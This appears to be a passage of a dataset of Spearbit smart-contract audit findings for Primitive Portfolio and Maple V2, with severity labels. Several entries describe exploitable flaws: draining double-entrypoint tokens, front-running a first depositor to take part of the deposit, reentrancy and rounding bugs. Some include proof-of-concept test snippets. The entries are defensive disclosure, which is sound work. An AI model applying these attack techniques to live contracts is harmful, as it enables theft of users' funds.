assertGt(mev_asset_balance, initialBalance); assertGe(mev_quote_balance, initialBalance); console2.log( \"MEV asset/quote profit: %s \\t %s\", mev_asset_balance - initialBalance, mev_quote_balance - ,! initialBalance ); } 15 }", "labels": ["Spearbit", "Primitive", "Severity: High Risk"]}, {"title": "Missing signextend when dealing with non-full word signed integers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The AssemblyLib is using non-full word signed integers operations. If the signed data in the stack have not been signextend the twos complement arithmetic will not work properly, most probably reverting. The solidity compiler does this cleanup but this cleanup is not guaranteed to be done while using the inline assem- bly.", "labels": ["Spearbit", "Primitive", "Severity: Medium Risk"]}, {"title": "Tokens With Multiple Addresses Can Be Stolen Due to Reliance on balanceOf", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "Some ERC20 tokens have multiple valid contract addresses that serve as entrypoints for manipulat- ing the same underlying storage (such as Synthetix tokens like SNX and sBTC and the TUSD stablecoin). Because the FVM holds all tokens for all pools in the same contract, assumes that a contract address is a unique identifier for a token, and relies on the return value of balanceOf for manipulated tokens to determine what transfers are needed during transaction settlement, multiple entrypoint tokens are not safe to be used in pools. For example, suppose there is a pool with non-zero liquidity where one token has a second valid address. An attacker can atomically create a second pool using the alternate address, allocate liquidity, and then immediately deallocate it. During execution of the _settlement function, getNetBalance will return a positive net balance for the double entrypoint token, crediting the attacker and transferring them the entire balance of the double entrypoint token. This attack only costs gas, as the allocation and deallocation of non-double entrypoint tokens will cancel out.", "labels": ["Spearbit", "Primitive", "Severity: Medium Risk"]}, {"title": "Swap amounts are always estimated with priority fee", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "A pool can have a priority fee that is only applied when the pool controller (contract) performs a swap. However, when estimating a swap with getAmountOut the priority fee will always be applied as long as there is a controller and a priority fee. As the priority fee is usually less than the normal fee, the input amount will be underestimated for non-controllers and the input amount will be too low and the swap reverts.", "labels": ["Spearbit", "Primitive", "Severity: Medium Risk"]}, {"title": "Rounding functions are wrong for negative integers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The AssemblyLib.scaleFromWadUpSigned and AssemblyLib.scaleFromWadDownSigned both work on int256s and therefore also on negative integers. However, the rounding is wrong for these. Rounding down should mean rounding towards negative infinity, and rounding up should mean rounding towards positive infinity. The scaleFromWadDownSigned only performs a truncations, rounding negative integers towards zero. This function is used in checkInvariant to ensure the new invariant is not less than the new invariant in a swap: int256 liveInvariantWad = invariant.scaleFromWadDownSigned(pools[poolId].pair.decimalsQuote); int256 nextInvariantWad = nextInvariant.scaleFromWadDownSigned( pools[poolId].pair.decimalsQuote ); nextInvariantWad >= liveInvariantWad It can happen for quote tokens with fewer decimals, for example, 6 with USDC, that liveInvariantWad was rounded from a positive 0.9999e12 value to zero. And nextInvariantWad was rounded from a negative value of -0.9999e12 to zero. The check passes even though the invariant is violated by almost 2 quote token units.", "labels": ["Spearbit", "Primitive", "Severity: Medium Risk"]}, {"title": "LPs can lose fees if fee growth accumulator overflows their checkpoint", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "Fees (that are not reinvested in the pool) are currently tracked through an accumulator value pool.feeGrowthGlobalAsset and pool.feeGrowthGlobalQuote, computed as asset or quote per liquidity. Each user providing liquidity has a checkpoint of these values from their last sync (claim). When syncing new fees, the distance from the current value to the users checkpoint is computed and multiplied by their liquidity. The accumu- lator values are deliberately allowed to overflow as only the distance matters. However, if an LP does not sync its fees and the accumulator grows, overflows, and grows larger than their last checkpoint, the LP loses all fees. Example:  User allocates at pool.feeGrowthGlobalAsset = 1000e36  pool.feeGrowthGlobalAsset grows and overflows to 0. differenceAsset is still accurate.  pool.feeGrowthGlobalAsset grows more and is now at 1000e36 again. differenceAsset will be zero. If the user only claims their fees now, theyll earn 0 fees.", "labels": ["Spearbit", "Primitive", "Severity: Medium Risk"]}, {"title": "Unnecessary left shift in encodePoolId", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The encodePoolId performs a left shift of 0. This is a noop.", "labels": ["Spearbit", "Primitive", "Severity: Gas Optimization"]}, {"title": "_syncPool performs unnecessary pool state updates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The _syncPool function is only called during a swap. During a swap the liquidity never changes and the pools last timestamp has already been updated in _beforeSwapEffects.", "labels": ["Spearbit", "Primitive", "Severity: Gas Optimization"]}, {"title": "Portfolio.sol gas optimizations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "Throughout the contract weve identified a number of minor gas optimizations that can be performed. Weve gathered them into one issue to keep the issue number as small as possible.  L750 The msg.value > 0 check is done also in the __wrapEther__ call  L262 The following substitutions can be optimized in case assets are 0 by moving each instruction within the ifs on lines 256-266 pos.tokensOwedAsset -= claimedAssets.safeCastTo128(); pos.tokensOwedQuote -= claimedQuotes.safeCastTo128();  L376 Consider using the pool object (if it remains as a storage object) instead of pools[args.poolId]  L444:L445 The following two instructions can be grouped into one. output = args.output; output = output.scaleToWad(...  L436:L443 The internalBalance variable can be discarded due to the fact that it is used only within the input assignment. uint256 internalBalance = getBalance( msg.sender, _state.sell ? pool.pair.tokenAsset : pool.pair.tokenQuote ); input = args.useMax == 1 ? internalBalance : args.input; input = input.scaleToWad( _state.sell ? pool.pair.decimalsAsset : pool.pair.decimalsQuote );  L808 Assuming that the swap instruction will be one of the most used instructions, might be worth moving it as first if condition to save gas.  L409 The if (args.input == 0) revert ZeroInput(); can be removed as it will result in iteration.input being zero and reverting on L457.", "labels": ["Spearbit", "Primitive", "Severity: Gas Optimization"]}, {"title": "Incomplete NatSpec comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "Throughout the IPortofolio.sol interface, various NatSpec comments are missing or incomplete", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Inaccurate Comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "These comments are inaccurate. [1] The hex value on this line translates to v0.1.0-beta instead of v1.0.0-beta. [2] computeTau returns either the time until pool maturity, or zero if the pool is already expired. [3] These comments do not properly account for the two byte offset from the start of the array (in L94, only in the endpoint of the slice).", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Check for priorityFee should have its own custom error", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The check for invalid priorityFee within the checkParameters function uses the same custom error as the one for fee. This could lead to confusion in the error output.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Unclear @dev comment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "This comment is misleading. It implies that cache is used to \"check\" state while it in fact changes it.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Unused custom error", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "Unused error error AlreadySettled();", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Use named constants", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The decodeSwap function compares a value against the constant 6. This value indicates the SWAP_- ASSET constant. sellAsset := eq(6, and(0x0F, byte(0, value)))", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "scaleFromWadUp and scaleFromWadUpSigned can underflow", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The scaleFromWadUp and scaleFromWadUpSigned will underflow if the amountWad parameter is 0 because they perform an unchecked subtraction on it: outputDec := add(div(sub(amountWad, 1), factor), 1) // ((a-1) / b) + 1", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "AssemblyLib.pack does not clear lowers upper bits", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The pack function packs the 4 lower bits of two bytes into a single byte. If the lower parameter has dirty upper bits, they will be mixed with the higher byte and be set on the final return value.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "AssemblyLib.toBytes8/16 functions assumes a max raw length of 16", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The toBytes16 function only works if the length of the bytes raw parameter is at most 16 because of the unchcked subtraction: let shift := mul(sub(16, mload(raw)), 8) The same issue exists for the toBytes8 function.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "PortfolioLib.maturity returns wrong value for perpertual pools", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "A pool can be a perpetual pool that is modeled as a pool with a time to maturity always set to 1 year in the computeTau. However, the maturity function does not return this same maturity. This currently isnt a problem as maturity is only called from computeTau in case it is not a perpetual pool.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "_createPool has incomplete NatSpec and event args", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The _createPool function contains incomplete NatSpec specifications. Furthermore, the event emitted by this function can be improved by adding more arguments.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "_liquidityPolicy is cast to a uint8 but it should be a uint16", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "During _createPool the pool curve parameters are set. One of them is the jit parameter which is a uint16. It can be assigned the default value of _liquidityPolicy but it is cast to a uint8. If the _liquidityPolicy constant is ever changed to a value greater than type(uint8).max a wrong jit value will be assigned.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Update _feeSavingEffects documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The _feeSavingEffects documentation states: @return bool True if the fees were saved in positions owed tokens instead of re-invested.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Document checkInvariant and resolve confusing naming", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The checkInvariant functions return values are undocumented and the used variables names are confusing.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Token amounts are in wrong decimals if useMax parameter is used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The allocate and swap functions have a useMax parameter that sets the token amounts to be used to the net balance of the contract. This net balance is the return value of a getNetBalance call, which is in token decimals. The code that follows (getPoolMaxLiquidity for allocate, iteration.input for swap) expects these amounts to be in WAD units. Using this parameter with tokens that don't have 18 decimals does not work correctly. The actual tokens used will be far lower than the expected amount to be used which will lead to user loss as the tokens remain in the contract after the action.", "labels": ["Spearbit", "Primitive", "Severity: High Risk"]}, {"title": "getAmountOut underestimates outputs leading to losses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "When computing the output, the getAmountOut performs a bisection. However, this bisection returns any root of the function, not the lowest root. As the invariant is far from being strictly monotonic in R_x, it contains many neighbouring roots (> 2e9 in the example) and it's important to return the lowest root, corresponding to the lowest nextDependent, i.e., it leads to a larger output amount amountOut = prevDependent - nextDependent. Users using this function to estimate their outputs can incur significant losses.  Example: Calling getAmountOut(poolId, false, 1, 0, address(0)) with the pool configuration in the example will return amtOut = 123695775, whereas the real max possible amtOut for that swap is 33x higher at 4089008108. The core issue is that invariant is not strictly monotonic, invariant(R_x, R_y) = invariant(R_x + 2_852_- 050_358, R_y), there are many neighbouring roots for the pool configuration: function test_eval() public { uint128 R_y = 56075575; uint128 R_x = 477959654248878758; uint128 stk = 117322822; uint128 vol = 406600000000000000; uint128 tau = 2332800; int256 prev = Invariant.invariant({R_y: R_y, R_x: R_x, stk: stk, vol: vol, tau: tau}); // this is the actual dependent that still satisfies the invariant R_x -= 2_852_050_358; int256 post = Invariant.invariant({R_y: R_y, R_x: R_x, stk: stk, vol: vol, tau: tau}); 25 console2.log(\"prev: %s\", prev); console2.log(\"post: %s\", post); assertEq(post, prev); assertEq(post, 0); }", "labels": ["Spearbit", "Primitive", "Severity: Medium Risk"]}, {"title": "getAmountOut Calculates an Output Value That Sets the Invariant to Zero, Instead of Preserving Its Value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The swap function enforces that the pool's invariant value does not decrease; however, the getA- mountOut function computes an expected swap output based on setting the pool's invariant to zero, which is only equivalent if the initial value of the invariant was already zero--which will generally not be the case as fees accrue and time passes. This is because in computeSwapStep (invoked by getAmountOut [1]), the func- tion (optimizeDependentReserve) passed [2] to the bisection algorithm for root finding returns just the invariant evaluated on the current arguments [3] instead of the difference between the evaluated and original invariant. As a consequence, getAmountOut will return an inaccurate result when the starting value of the invariant is non-zero, leading to either disadvantageous swaps or swaps that revert, depending on whether the current pool invariant value is less than or greater than zero.", "labels": ["Spearbit", "Primitive", "Severity: Medium Risk"]}, {"title": "getAmountOut Does Not Adjust The Pool's Reserve Values Based on the liquidityDelta Parameter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The liquidityDelta parameter allows a caller to adjust the liquidity in a pool before simulating a swap. However, corresponding adjustments are not made to the per-pool reserves, virtualX and virtualY. This makes the reserve-to-liquidity ratios used in the calculations incorrect, leading to inaccurate results (or potentially reverts if the invalid values fall outside of allowed ranges). Use of the inaccurate swap outputs could lead either to swaps at bad prices or swaps that revert unexpectedly.", "labels": ["Spearbit", "Primitive", "Severity: Medium Risk"]}, {"title": "Bisection always uses max iterations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The current bisection algorithm chooses the mid point as root = (lower + upper) / 2; and the bisection terminates if either upper - lower < 0 or maxIterations is reached. Given upper >= lower throughout the code, it's easy to see that upper - lower < 0 can never be satisfied. The bisection will always use the max iterations. However, even with an epsilon of 1 it can happen that the mid point root is the same as the lower bound if upper = lower + 1. The if (output * lowerOutput < 0) condition will never be satisfied and the else case will always run, setting the lower bound to itself. The bisection will keep iterating with the same lower and upper bounds until max iterations are reached.", "labels": ["Spearbit", "Primitive", "Severity: Low Risk"]}, {"title": "Potential reentrancy in claimFees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The contract performs all transfers in the _settlement function and therefore _settlement can call- back to the user for reentrant tokens. To avoid reentrancy issues the _preLock() modifier implements a reentrancy check, but only if the called action is not happening during a multicall execution: function _preLock() private { // Reverts if the lock was already set and the current call is not a multicall. if (_locked != 1 && !_currentMulticall) { revert InvalidReentrancy(); } _locked = 2; } Therefore, multicalls are not protected against reentrancy and _settlement should never be executed, only once at the end of the original multicall function. However, the claimFee function can be called through a multicall by the protocol owner and it calls _settlement even if the execution is part of a multicall.", "labels": ["Spearbit", "Primitive", "Severity: Low Risk"]}, {"title": "Bisection can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The Bisection algorithm tries to find a root of the monotonic function. Evaluating the expensive invariant function at the lower point on each iteration can be avoided by caching the output function value whenever a new lower bound is set.", "labels": ["Spearbit", "Primitive", "Severity: Gas Optimization"]}, {"title": "Pool existence check in swap should happen earlier", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The swap function makes use of the pool pair's tokens to scale the input decimals before it checks if the pool even exists.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Pool creation in test uses wrong duration and volatility", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The second path with pairId != 0 in HelperConfigsLib's pool creation calls the createPool method with the volatility and duration parameters swapped, leading to wrong pool creations used in tests that use this path.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "First pool depositor can be front-run and have part of their deposit stolen", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The first deposit with a totalSupply of zero shares will mint shares equal to the deposited amount. This makes it possible to deposit the smallest unit of a token and profit off a rounding issue in the computation for the minted shares of the next depositor: (shares_ * totalAssets()) / totalSupply_ Example:  The first depositor (victim) wants to deposit 2M USDC (2e12) and submits the transaction.  The attacker front runs the victim's transaction by calling deposit(1) to get 1 share. They then transfer 1M USDC (1e12) to the contract, such that totalAssets = 1e12 + 1, totalSupply = 1.  When the victim's transaction is mined, they receive 2e12 / (1e12 + 1) * totalSupply = 1 shares (rounded down from 1.9999...).  The attacker withdraws their 1 share and gets 3M USDC * 1 / 2 = 1.5M USDC, making a 0.5M profit. During the migration, an _initialSupply of shares to be airdropped are already minted at initialization and are not affected by this attack.", "labels": ["Spearbit", "MapleV2.pd", "Severity: High Risk"]}, {"title": "Users depositing to a pool with unrealized losses will take on the losses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The pool share price used for deposits is always the totalAssets() / totalSupply, however the pool share price when redeeming is totalAssets() - unrealizedLosses() / totalSupply. The unrealized- Losses value is increased by loan impairments (LM.impairLoan) or when starting triggering a default with a liq- uidation (LM.triggerDefault). The totalAssets are only reduced by this value when the loss is realized in LM.removeLoanImpairment or LM.finishCollateralLiquidation. This leads to a time window where deposits use a much higher share price than current redemptions and future deposits. Users depositing to the pool during this time window are almost guaranteed to make losses when they In the worst case, a Pool.deposit might even be (accidentally) front-run by a loan impairment or are realized. liquidation.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Medium Risk"]}, {"title": "TransitionLoanManager.add does not account for accrued interest since last call", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The TransitionLoanManager.add advances the domain start but the accrued interest since the last domain start is not accounted for. If add is called several times, the accounting will be wrong. It therefore wrongly tracks the _accountedInterest variable.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Medium Risk"]}, {"title": "Unaccounted collateral is mishandled in triggerDefault", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The control flow of triggerDefault is partially determined by the value of MapleLoanLike(loan_- ).collateral() == 0. The code later assumes there are 0 collateral tokens in the loan if this value is true, which is incorrect in the case of unaccounted collateral tokens. In non-liquidating repossessions, this causes an overes- timation of the number of fundsAsset tokens repossessed, leading to a revert in the _disburseLiquidationFunds function. Anyone can trigger this revert by manually transferring 1 Wei of collateralAsset to the loan itself. In liq- uidating repossessions, a similar issue causes the code to call the liquidator's setCollateralRemaining function with only accounted collateral, meaning unaccounted collateral will be unused/stuck in the liquidator.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Medium Risk"]}, {"title": "Initial cycle time is wrong when queuing several config updates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The initial cycle time will be wrong if there's already an upcoming config change that changes the cycle duration. Example: currentCycleId: 100 config[0] = currentConfig = {initialCycleId: 1, cycleDuration = 1 days} config[1] = {initialCycleId: 101, cycleDuration = 7 days} Now, scheduling will create a config with initialCycleId: 103 and initialCycleTime = now + 3 * 1 days, but the cycle durations for cycles (100, 101, 102) are 1 days + 7 days + 7 days.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Medium Risk"]}, {"title": "Users cannot resubmit a withdrawal request as per the wiki", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "As per Maple's wiki: pool-v2::PoolManager.sol#371-L382, withdrawal-  Refresh: The withdrawal request can be resubmitted with the same amount of shares by calling pool.requestRedeem(0). However, the current implementation prevents Pool.requestRedeem() from being called where the shares_ pa- rameter is zero.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Accrued interest may be calculated on an overstated payment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The checkTotalAssets() function is a useful helper that may be used to make business decisions in the protocol. However, if there is a late loan payment, the total interest is calculated on an incorrect payment interval, causing the accrued interest to be overstated. It is also important to note that late interest will also be excluded from the total interest calculation.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "No deadline when liquidating a borrower's collateral", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "A loan's collateral is liquidated in the event of a late payment or if the pool delegate impairs a loan If the loan contains any amount of collateral (assuming it is different to the due to insolvency by the borrower. funds' asset), the liquidation process will attempt to sell the collateral at a discounted amount. Because a liquidation is considered active as long as there is remaining collateral in the liquidator contract, a user can knowingly liquidate all but 1 wei of collateral. As there is no incentive for others to liquidate this dust amount, it is up to the loan manager to incur the cost and responsibility of liquidating this amount before they can successfully call LoanManager.finishCollateralLiquidation().", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Loan impairments can be unavoidably unfair for borrowers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "When a pool delegate impairs a loan, the loan's _nextPaymentDueDate will be set to the min of If the pool delegate later decides to remove the im- block.timestamp and the current _nextPaymentDueDate. pairment, the original _nextPaymentDueDate is restored to its correct value. The borrower can also remove an impairment themselves by making a payment. In this case, the _nextPaymentDueDate is not restored, which is always worse for the borrower. This can be unfair since the borrower would have to pay late interest on a loan that was never actually late (according to the original payment due date). Another related consequence is that a borrower can be liquidated before the original payment due date even passes (this is possible as long as the loan is impaired more than gracePeriod seconds away from the original due date).", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "withdrawCover() vulnerable to reentrancy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "withdrawCover() allows for reentrancy and could be abused to withdraw below the minimum cover amount and avoid having to cover protocol insolvency through a bad liquidation or loan default. The moveFunds() function could transfer the asset amount to the recipient specified by the pool delegate. Some In this case, the pool delegate could reenter the tokens allow for callbacks before the actual transfer is made. withdrawCover() function and bypass the balance check as it is made before tokens are actually transferred. This can be repeated to empty out required cover balance from the contract. It is noted that the PoolDelegateCover contract is a protocol controlled contract, hence the low severity.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Bad parameter encoding and deployment when using wrong initializers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The initializers used to encode the arguments, when deploying a new pool in PoolDeployer, might not be the initializers that the proxy factory will use for the default version and might lead to bad parameter encoding & deployments if a wrong initializer is passed.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Event LoanClosed might be emitted with the wrong value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "In function closeLoan function, the fees are got by the getClosingPaymentBreakdown function and it is not adding refinances fees after in code are paid all fee by payServiceFees which may include refinances fees. The event LoanClose might be emitted with the wrong fee value.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Bug in makePayment() reverts when called with small amounts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "When makePayment() is called with an amount which is less than the fees payable, then the trans- action will always revert, even if there is an adequate amount of drawable funds. The revert happens due to an underflow in getUnaccountedAmount() because the token balance is decremented on the previous line without updating drawable funds.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Pool.previewWithdraw always reverts but Pool.withdraw can succeed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The Pool.previewWithdraw => PM. previewWithdraw => WM.previewWithdraw function call se- quence always reverts in the WithdrawalManager. However, the Pool.withdraw function can succeed. This behavior might be unexpected, especially, as integrators call previewWithdraw before doing the actual withdraw call.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Setting a new WithdrawalManager locks funds in old one", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The WithdrawalManager only accepts calls from a PoolManager. When setting a new withdrawal manager with PoolManager.setWithdrawalManager, the old one cannot be accessed anymore. Any user shares locked for withdrawal in the old one are stuck.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Use whenProtocolNotPaused on migrate() instead of upgrade() for more complete protection", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "whenProtocolNotPaused is added to migrate() for the Liquidator, MapleLoan, and Withdrawal- Manager contracts in order to protect the protocol by preventing it from upgrading while the protocol is paused. However, this protection happens only during upgrade, and not during instantiation.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Missing post-migration check in PoolManager.sol could result in lost funds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The protocol employs an upgradeable/migrateable system that includes upgradeable initializers for factory created contracts. For the most part, a storage value that was left uninitialized due to an erroneous initializer would not be affect protocol funds. For example forgetting to initialize _locked would cause all nonReentrant functions to revert, but no funds lost. However, if the poolDelegateCover address were unset and depositCover() were called, the funds would be lost as there is no to != address(0) check in transferFrom.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Globals.poolDelegates[delegate_].ownedPoolManager mapping can be overwritten", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The Globals.poolDelegates[delegate_].ownedPoolManager keeps track of a single pool manager for a pool delegate. It can happen that the same pool delegate is registered for a second pool manager and the mapping is overwritten, by calling PM.acceptPendingPoolDelegate -> Globals.transferOwnedPoolManager or Globals.activatePoolManager.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Pool withdrawals can be kept low by non-redeeming users", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "In the current pool design, users request to exit the pool and are scheduled for a withdrawal window in the withdrawal manager. If the pool does not have enough liquidity, their share on the available pool liquidity is proportionate to the total shares of all users who requested to withdraw in that withdrawal window. It's possible for griefers to keep the withdrawals artificially low by requesting a withdrawal but not actually withdraw- ing during the withdrawal window. These griefers are not penalized but their behavior leads to worse withdrawal amounts for every other honest user.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "_getCollateralRequiredFor should round up", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The _getCollateralRequiredFor rounds down the collateral that is required from the borrower. This benefits the borrower.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Low Risk"]}, {"title": "Use the cached variable in makePayment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The claim function is called using _nextPaymentDueDate instead of nextPaymentDueDate_", "labels": ["Spearbit", "MapleV2.pd", "Severity: Gas Optimization"]}, {"title": "No need to explicitly initialize variables with default values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "By default a value of a variable is set to 0 for uint, false for bool, address(0) for address. . . Explicitly initializing/setting it with its default value wastes gas.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Gas Optimization"]}, {"title": "Cache calculation in getExpectedAmount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The decimal precision calculation is used twice in the getExpectedAmount function, if you cache into a new variable would save some gas.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Gas Optimization"]}, {"title": "For-Loop Optmization", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The for-loop can be optimized in 4 ways: 1. Removing initialization of loop counter if the value is 0 by default. 2. Caching array length outside the loop. 3. Prefix increment (++i) instead of postfix increment (i++). 4. Unchecked increment. - for (uint256 i_ = 0; i_ < loans_.length; i_++) { + uint256 length = loans_.length; + for (uint256 i_; i_ < length; ) { ... + unchecked { ++i; } }", "labels": ["Spearbit", "MapleV2.pd", "Severity: Gas Optimization"]}, {"title": "Pool._divRoundUp can be more efficient", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The gas cost of Pool._divRoundUp can be reduced in the context that it's used in.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Gas Optimization"]}, {"title": "Liquidator uses different reentrancy guards than rest of codebase", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "All other reentrancy guards of the codebase use values 1/2 instead of 0/1 to indicate NOT_- LOCKED/LOCKED.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Gas Optimization"]}, {"title": "Use block.timestamp instead of domainStart in removeLoanImpairment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The removeLoanImpairment function adds back all interest from the payment's start date to domain- Start. The _advanceGlobalPaymentAccounting sets domainStart to block.timestamp.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Gas Optimization"]}, {"title": "setTimelockWindows checks isGovernor multiple times", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf", "body": "The Globals.setTimelockWindows function calls setTimelockWindow in a loop and each time set- TimelockWindow's isGovernor is checked.", "labels": ["Spearbit", "MapleV2.pd", "Severity: Gas 